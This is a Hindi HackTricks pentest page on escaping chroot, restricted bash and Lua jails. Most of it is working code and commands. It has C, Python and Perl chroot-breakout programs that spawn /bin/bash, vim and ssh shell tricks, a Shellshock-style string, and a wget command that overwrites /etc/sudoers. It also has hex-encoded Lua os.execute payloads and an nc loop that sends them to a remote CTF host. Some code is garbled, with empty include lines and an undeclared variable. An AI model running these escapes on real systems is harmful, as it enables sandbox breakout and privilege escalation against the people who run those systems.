# Escaping from Jails

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर मुझे 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) **का अनुसरण करें**.
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## **GTFOBins**

**खोजें** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **यदि आप "Shell" गुण के साथ कोई बाइनरी निष्पादित कर सकते हैं**

## Chroot Escapes

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) से: Chroot तंत्र **जानबूझकर छेड़छाड़** से बचाने के लिए **नहीं है** **विशेषाधिकार प्राप्त** (**root**) **उपयोगकर्ताओं** के खिलाफ। अधिकांश सिस्टमों पर, chroot संदर्भ ठीक से स्टैक नहीं होते हैं और पर्याप्त विशेषाधिकारों वाले chrooted प्रोग्राम **दूसरा chroot करके बाहर निकल सकते हैं**।\
आमतौर पर इसका मतलब है कि बचने के लिए आपको chroot के अंदर root होना चाहिए।

{% hint style="success" %}
**टूल** [**chw00t**](https://github.com/earthquake/chw00t) को निम्नलिखित परिदृश्यों का दुरुपयोग करने और `chroot` से बचने के लिए बनाया गया था।
{% endhint %}

### Root + CWD

{% hint style="warning" %}
यदि आप chroot के अंदर **root** हैं तो आप **बच सकते हैं** एक **और chroot बनाकर**। यह इसलिए क्योंकि 2 chroots सह-अस्तित्व में नहीं रह सकते (Linux में), इसलिए यदि आप एक फोल्डर बनाते हैं और फिर उस नए फोल्डर पर एक **नया chroot बनाते हैं** जिसमें आप बाहर होते हैं, तो आप अब नए chroot के बाहर होंगे और इसलिए आप FS में होंगे।

यह इसलिए होता है क्योंकि आमतौर पर chroot आपकी कार्य निर्देशिका को निर्दिष्ट वाले में नहीं ले जाता है, इसलिए आप एक chroot बना सकते हैं लेकिन उससे बाहर हो सकते हैं।
{% endhint %}

आमतौर पर आपको chroot जेल के अंदर `chroot` बाइनरी नहीं मिलेगी, लेकिन आप **कंपाइल, अपलोड और निष्पादित** एक बाइनरी कर सकते हैं:

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("chroot-dir", 0755); chroot("chroot-dir"); for(int i = 0; i < 1000; i++) { chdir(".."); } chroot("."); system("/bin/bash"); }

````
</details>

<details>

<summary>पायथन</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
````



\`\`\`perl #!/usr/bin/perl mkdir "chroot-dir"; chroot "chroot-dir"; foreach my $i (0..1000) { chdir ".." } chroot "."; system("/bin/bash"); \`\`\`

</details>

### Root + Saved fd

{% hint style="warning" %}
यह पिछले मामले के समान है, लेकिन इस मामले में **हमलावर वर्तमान डायरेक्टरी के लिए एक फाइल डिस्क्रिप्टर स्टोर करता है** और फिर **नए फोल्डर में chroot बनाता है**। अंत में, चूंकि उसके पास chroot के **बाहर** उस **FD** तक **पहुँच** है, वह उसे एक्सेस करता है और **बच निकलता है**।
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>

\`\`\`c #include #include #include

//gcc break\_chroot.c -o break\_chroot

int main(void) { mkdir("tmpdir", 0755); dir\_fd = open(".", O\_RDONLY); if(chroot("tmpdir")){ perror("chroot"); } fchdir(dir\_fd); close(dir\_fd); for(x = 0; x < 1000; x++) chdir(".."); chroot("."); }

````
</details>

### Root + Fork + UDS (Unix Domain Sockets)

<div data-gb-custom-block data-tag="hint" data-style='warning'>

FD को Unix Domain Sockets के माध्यम से पास किया जा सकता है, इसलिए:

* एक चाइल्ड प्रोसेस (fork) बनाएं
* UDS बनाएं ताकि पेरेंट और चाइल्ड बात कर सकें
* चाइल्ड प्रोसेस में एक अलग फोल्डर में chroot चलाएं
* पेरेंट प्रोसेस में, नए चाइल्ड प्रोसेस chroot के बाहर के फोल्डर का एक FD बनाएं
* उस FD को UDS का उपयोग करके चाइल्ड प्रोसेस को पास करें
* चाइल्ड प्रोसेस उस FD पर chdir करें, और चूंकि वह अपने chroot के बाहर है, वह जेल से बच निकलेगा

</div>

### &#x20;Root + Mount

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* chroot के अंदर एक डायरेक्टरी में रूट डिवाइस (/) को माउंट करना
* उस डायरेक्टरी में chroot करना

यह Linux में संभव है

</div>

### Root + /proc

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* chroot के अंदर एक डायरेक्टरी में procfs को माउंट करना (अगर वह पहले से नहीं है)
* एक pid की तलाश करना जिसकी अलग root/cwd प्रविष्टि हो, जैसे: /proc/1/root
* उस प्रविष्टि में chroot करना

</div>

### Root(?) + Fork

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* एक Fork (चाइल्ड प्रोसेस) बनाएं और FS में गहरे एक अलग फोल्डर में chroot करें और उस पर CD करें
* पेरेंट प्रोसेस से, जहां चाइल्ड प्रोसेस है उस फोल्डर को चाइल्ड्रेन के chroot से पहले के फोल्डर में मूव करें
* यह चाइल्ड प्रोसेस खुद को chroot के बाहर पाएगा

</div>

### ptrace

<div data-gb-custom-block data-tag="hint" data-style='warning'>

* पहले यूजर्स अपने प्रोसेस को खुद के प्रोसेस से डिबग कर सकते थे... लेकिन अब यह डिफ़ॉल्ट रूप से संभव नहीं है
* फिर भी, अगर यह संभव है, तो आप किसी प्रोसेस में ptrace कर सकते हैं और उसके अंदर एक shellcode निष्पादित कर सकते हैं ([इस उदाहरण को देखें](linux-capabilities.md#cap_sys_ptrace)).

</div>

## Bash Jails

### Enumeration

जेल के बारे में जानकारी प्राप्त करें:
```bash
echo $SHELL
echo $PATH
env
export
pwd
````

#### PATH संशोधित करें

जांचें कि क्या आप PATH env वेरिएबल को संशोधित कर सकते हैं

```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```

#### विम का उपयोग करना

```bash
:set shell=/bin/sh
:shell
```

#### स्क्रिप्ट बनाएं

जांचें कि क्या आप _/bin/bash_ सामग्री के साथ एक निष्पादन योग्य फ़ाइल बना सकते हैं

```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```

#### SSH से bash प्राप्त करें

यदि आप ssh के माध्यम से पहुँच रहे हैं, तो आप इस चाल का उपयोग करके एक bash shell निष्पादित कर सकते हैं:

```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```

#### घोषणा

```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```

#### Wget

आप उदाहरण के लिए sudoers फ़ाइल को ओवरराइट कर सकते हैं

```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```

#### अन्य तरकीबें

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**इस पृष्ठ को भी देखना दिलचस्प हो सकता है:**

### Python Jails

Python jails से बचने की तरकीबें निम्नलिखित पृष्ठ पर दी गई हैं:

### Lua Jails

इस पृष्ठ पर आप Lua में उपलब्ध ग्लोबल फंक्शन्स की जानकारी पा सकते हैं: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval के साथ कमांड निष्पादन:**

```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```

कुछ तरकीबें **बिना डॉट्स का उपयोग किए लाइब्रेरी के फंक्शन्स को कॉल करने के लिए**:

```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```

पुस्तकालय के कार्यों की सूची बनाएं:

```bash
for k,v in pairs(string) do print(k,v) end
```

ध्यान दें कि जब भी आप पिछले वन लाइनर को **अलग-अलग lua वातावरण में निष्पादित करते हैं, तो फंक्शन्स का क्रम बदल जाता है**। इसलिए यदि आपको कोई विशेष फंक्शन निष्पादित करना हो, तो आप विभिन्न lua वातावरणों को लोड करके और लाइब्रेरी के पहले फंक्शन को कॉल करके एक ब्रूट फोर्स हमला कर सकते हैं:

```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```

**इंटरएक्टिव lua शेल प्राप्त करें**: यदि आप एक सीमित lua शेल के अंदर हैं, तो आप नया lua शेल (और आशा है कि असीमित) निम्नलिखित कॉल करके प्राप्त कर सकते हैं:

```bash
debug.debug()
```

### संदर्भ

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (स्लाइड्स: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))



</details>
